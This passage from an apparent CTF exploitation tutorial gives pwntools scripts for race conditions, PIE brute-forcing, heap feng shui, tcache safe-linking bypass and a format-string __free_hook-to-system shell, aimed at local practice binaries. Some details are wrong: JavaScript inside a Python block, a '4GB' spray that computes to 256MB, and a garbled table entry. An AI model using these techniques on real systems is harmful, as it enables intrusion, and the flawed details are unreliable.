import threading, time

p = process("./bank_race")

def withdraw(amount):
    p.sendline(b"2")              # withdraw
    p.sendline(str(amount).encode())

def check_balance():
    p.sendline(b"1")              # check balance
    return int(p.recvline())

# Spawn many threads to race the withdraw
balance = check_balance()
log.info(f"Starting balance: {balance}")

threads = []
for _ in range(10):
    t = threading.Thread(target=withdraw, args=(balance,))
    threads.append(t)

# Fire all threads simultaneously
for t in threads:
    t.start()
for t in threads:
    t.join()

new_balance = check_balance()
log.info(f"New balance: {new_balance}")
# If new_balance is negative or zero and we got money out, race won
```

**Using `prctl`/`sched_yield` for precise timing:**

```python
from pwn import *
import ctypes, threading

libc = ctypes.CDLL("libc.so.6")

def yield_cpu():
    """Yield the CPU to increase race window."""
    libc.sched_yield()

def race_thread(op, iterations=10000):
    for _ in range(iterations):
        op()
        yield_cpu()    # Give competing thread a chance
```

---

## 7. Exploit Reliability & Engineering

### 7.1 Brute Force vs Information Leak

| Strategy      | Pros                          | Cons                             |
|---------------|-------------------------------|----------------------------------|
| Brute force   | No info leak needed           | Unreliable, slow, crashes logs   |
| Info leak     | Reliable, deterministic        | Requires leak primitive          |
| Partial leak  | Leaks some bits, brute remainder | Moderate reliability            |

**When to brute force:**
- No possible info leak (binary is minimal, no output).
- ASLR entropy is low (32-bit: 16 bits = 65K tries, but often only 8–12 bits of entropy).
- Fork server (no parent crash, can retry without reconnect overhead).

```python
from pwn import *

# Brute force PIE on 32-bit (12-bit ASLR entropy)
# 4096 tries, ~1 second each = ~1 hour

offset_low12 = 0xa3c    # known low 12 bits of target gadget

for attempt in range(4096):
    try:
        p = process("./pie_vuln")
        # Leak or partial write gives us base alignment
        # Or just spray and hope
        base_guess = (attempt << 12) + 0x56500000   # estimated range
        target = base_guess + offset_low12
        payload = b"A" * offset + p32(target)
        p.sendline(payload)
        response = p.recv(timeout=0.5)
        if b"$" in response or b"#" in response:
            log.success(f"Got shell on attempt {attempt}")
            p.interactive()
            break
        p.close()
    except:
        p.close()
```

### 7.2 Heap Feng Shui

Heap Feng Shui is the art of manipulating the heap into a predictable state so that allocations land where you want them.

**Core principles:**
1. **Drain tcache/fastbins**: Allocate until bins are empty.
2. **Allocate target objects**: Allocate the objects you want adjacent.
3. **Free in order**: Free objects to create predictable free lists.
4. **Reallocate as victim**: Allocate over freed chunks with controlled data.

```python
from pwn import *

p = process("./heap_feng")
libc = ELF("./libc.so.6")

def alloc(size, data=b"A"):
    p.sendline(b"1")
    p.sendlineafter(b"Size: ", str(size).encode())
    p.sendlineafter(b"Data: ", data)

def free(idx):
    p.sendline(b"2")
    p.sendlineafter(b"Idx: ", str(idx).encode())

# Step 1: Drain tcache for size 0x80
for i in range(7):
    alloc(0x78)       # indices 0-6
for i in range(7):
    free(i)           # fill tcache

# Step 2: Allocate victim and target objects
alloc(0x18)            # idx 7 — guard chunk (prevent consolidation)
alloc(0x78)            # idx 8 — target: we'll overflow from here
alloc(0x78)            # idx 9 — victim: will be corrupted
alloc(0x18)            # idx 10 — guard chunk

# Step 3: Overflow from target into victim's metadata
free(9)                # put victim in unsorted bin (tcache full)
alloc(0x78, b"B" * 0x78 + p64(0x21) + p64(0) * 2)  # overflow into next chunk

# Step 4: Trigger use of corrupted metadata
# ... depends on specific vulnerability
```

**Feng Shui for browser exploitation:**

```python
# Browser heap spray: allocate many objects to create predictable layout
# Use typed arrays for precise control

spray = []
for i in range(0x10000):
    spray.append(new ArrayBuffer(0x1000))  # 4GB spray

# Each ArrayBuffer's backing store is now at a predictable offset
# From a type confusion, we can calculate absolute addresses
```

### 7.3 Making Exploits Reliable

**Key techniques for reliability:**

1. **Align your writes**: Use `%hn` or `%hhn` for format strings instead of `%n` to reduce output size.
2. **Use safe-linking bypasses**: In glibc 2.32+, tcache has safe-linking (`ptr ^ (addr >> 12)`). Undo it:

```python
from pwn import *

def safe_linking_encode(ptr, location):
    """Encode a pointer for glibc 2.32+ tcache safe-linking."""
    return (ptr ^ (location >> 12))

def safe_linking_decode(encoded, location):
    """Decode a safe-linked pointer."""
    return encoded ^ (location >> 12)

# When poisoning tcache on glibc 2.32+:
target = libc.symbols["__free_hook"]
chunk_addr = heap_base + 0x2a0   # address of the tcache chunk we're writing to
encoded_target = safe_linking_encode(target, chunk_addr)
# Write encoded_target as the next pointer in the tcache free list
```

3. **Handle partial overwrites**: Write only as many bytes as needed; don't zero out the rest.

```python
# Bad: overwrites everything after the target
payload = b"A" * offset + p64(target_addr)  # may contain null bytes

# Good: partial overwrite preserves high bytes
payload = b"A" * offset + p16(target_addr & 0xffff)  # 2-byte overwrite only
```

4. **Clean up after yourself**: Restore corrupted metadata to prevent crashes.

```python
# After corrupting a chunk's size field for overflow:
# Restore it before freeing to avoid malloc assertion failures
write_to(chunk_addr + 8, p64(original_size))
```

5. **Use `pause()` and `gdb.attach()` for debugging**:

```python
from pwn import *

p = process("./vuln")
# Pause and attach debugger
gdb.attach(p, """
b *0x400742
c
""")
p.interactive()
```

### 7.4 Debugging Exploits with GDB/pwndbg

**Essential pwndbg commands:**

```
# Heap inspection
heap                    # Show heap chunks
bins                    # Show all bin freelists
tcache                  # Show tcache bins
largebins              # Show large bin contents

# Memory inspection
vis_heap_chunks         # Visualize heap with chunk boundaries
dq <addr> <count>      # Dump memory as qwords
telescope <addr> <n>   # Follow pointer chain

# Context
context                 # Show registers, stack, disassembly, code
nearpc                 # Disassembly near PC

# Watchpoints
watch <addr>            # Break on memory write
rwatch <addr>           # Break on memory read
awatch <addr>           # Break on memory access

# Custom for exploit dev
got                     # Show GOT entries
checksec               # Show binary protections
```

**Full exploit debugging workflow:**

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

p = process("./vuln")
elf = ELF("./vuln")
libc = ELF("./libc.so.6")

# Attach with breakpoint before vulnerable function
gdb.attach(p, f"""
set pagination off
b *{hex(elf.symbols['vuln_func'])}
commands
  x/20gx $rsp
  c
end
c
""")

# Exploit steps with verification after each
log.info("Step 1: Leak libc address")
p.sendline(b"%9$sAAAA" + p64(elf.got["puts"]))
leak = u64(p.recvuntil(b"AAAA")[:-4].ljust(8, b'\x00'))
libc.address = leak - libc.symbols["puts"]
log.success(f"libc base: {hex(libc.address)}")

log.info("Step 2: Overwrite __free_hook")
writes = {libc.symbols["__free_hook"]: libc.symbols["system"]}
payload = fmtstr_payload(8, writes, write_size='byte')
p.sendline(payload)

log.info("Step 3: Trigger free with '/bin/sh'")
p.sendline(b"/bin/sh")
p.interactive()
```

**Script for detecting heap corruption:**

```bash
# Run with MALLOC_CHECK_ to detect heap corruption
MALLOC_CHECK_=1 ./vuln

# Run under valgrind for memory error detection
valgrind --leak-check=full ./vuln

# Use AddressSanitizer for compile-time checking
gcc -fsanitize=address -g vuln.c -o vuln_asan
```

**Automated cyclic pattern finding:**

```python
from pwn import *

p = process("./vuln")

# Generate cyclic pattern
pattern = cyclic(500)
p.sendline(pattern)

# After crash, examine core dump or GDB for offset
# pwndbg automatically shows: "CR4SH: offset in cyclic pattern"
# Or manually:
crash_addr = 0x61616168   # example crash address
offset = cyclic_find(crash_addr)
log.info(f"Crash offset: {offset}")
```

---

## Appendix: Quick Reference

| Technique | Primitives Needed | Key Protections Bypassed |
|-----------|-------------------|---------------------------|
| Format string | Stack leak + %n write | ASLR (via GOT leak), PIE (via stack leak) |
| Integer overflow | Size check bypass | HindBinary validation |
| UAF/Type confusion | Dangling ptr + allocation | ASLR (vtable in heap), Full RELRO |
| ROP | Stack overflow + GOT/ROP gadgets | NX/DEP (no shellcode needed) |
| Partial overwrite | Small overflow (1-2 bytes) | PIE (within page), ASLR (low bits fixed) |
| JOP | Dispatch table + gadgets | Shadow stack, CET (no ret) |
| DOP | Arbitrary data write | CFI, CET, shadow stack (no control flow change) |
| Ret2dlresolve | Buffer overflow + PLT | ASLR (no libc leak needed) |
| Shellcode | Executable memory + write | None (requires RWX page) |
| Race condition | Competitive access | None (logic bug) |
| One-gadget | libc base + register constraints | NX, ASLR (with leak) |

### Common pwntools Patterns

```python
# Establish connection
p = process("./vuln")           # local
p = remote("host", port)        # remote

# ELF analysis
elf  = ELF("./vuln")
libc = ELF("./libc.so.6")

# Find GOT entries
elf.got["puts"]                  # GOT slot for puts
elf.plt["puts"]                  # PLT stub for puts

# Search for strings/gadgets
next(libc.search(b"/bin/sh\x00"))
rop = ROP(libc)
rop.call("system", [next(libc.search(b"/bin/sh\x00"))])
chain = rop.chain()

# Packing/unpacking
p64(0xdeadbeef)                  # pack 64-bit
u64(b"\x00" * 8)                # unpack 64-bit
p32(0x41414141)                  # pack 32-bit

# Interactive mode
p.interactive()                  # hand control to user

# Logging
log.info(f"Address: {hex(addr)}")
log.success(f"Got shell!")
log.failure(f"Exploit failed")
```

## References

1. [Phrack — Format String Vulnerabilities](http://phrack.org/issues/57/13.html) — Classic format string exploitation primer (Scut / team teso)
2. [Phrack — Advanced return-into-libc](http://phrack.org/issues/58/4.html) — Return-into-libc and return-oriented programming foundations
3. [CTF Wiki — Format String](https://ctf-wiki.org/pwn/linux/fmt-str/) — Comprehensive format string exploitation reference
4. [CTF Wiki — ROP and Advanced ROP](https://ctf-wiki.org/pwn/linux/rop/) — Return-oriented programming techniques and gadgets
5. [ROPgadget — Tool for ROP Chain Generation](https://github.com/JonathanSalwan/ROPgadget) — Automated gadget search and chain building
6. [pwntools — Shellcraft Module](https://docs.pwntools.com/en/stable/shellcraft/) — Shellcode generation for multiple architectures
7. [Shellstorm — Shellcode Database](http://shell-storm.org/shellcode/) — Public shellcode archive and testing
8. [How2Heap — Glibc Exploitation Techniques](https://github.com/shellphish/how2heap) — Progressive heap exploitation tutorials
9. [One Gadget — glibc execve Constraint Solver](https://github.com/david942j/one_gadget) — Find single-gadget execve offsets in glibc
10. [Pwntools Documentation](https://docs.pwntools.com/) — Python CTF exploit development framework

---

*This document covers the major advanced userspace exploitation techniques used in modern CTFs and vulnerability research. Each technique requires practice — set up a local environment using pwntools, pwndbg, and Ubuntu with specific glibc versions to master these methods.*